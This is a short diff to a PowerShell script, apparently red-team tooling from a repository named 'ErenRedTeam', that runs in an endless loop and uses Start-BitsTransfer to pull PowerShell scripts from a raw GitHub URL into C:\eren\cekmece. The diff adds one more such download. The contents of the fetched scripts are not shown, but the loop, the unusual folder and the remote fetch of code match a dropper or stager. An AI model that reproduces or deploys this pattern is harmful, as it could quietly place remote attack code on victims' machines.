@@ -30,6 +30,9 @@ while ($true) {
     if (-not (Test-Path "C:\eren\cekmece\korktunmu.ps1")) {
         Start-BitsTransfer -Source "https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/korktunmu.ps1" -Destination "C:\eren\cekmece\korktunmu.ps1"
     }
+     if (-not (Test-Path "C:\eren\cekmece\olegunnar.ps1")) {
+        Start-BitsTransfer -Source "https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/olegunnar.ps1" -Destination "C:\eren\cekmece\olegunnar.ps1"
+    }
      if (-not (Test-Path "C:\eren\cekmece\output")) {
         New-Item -Path "C:\eren\cekmece\output" -ItemType Directory -Force
     }
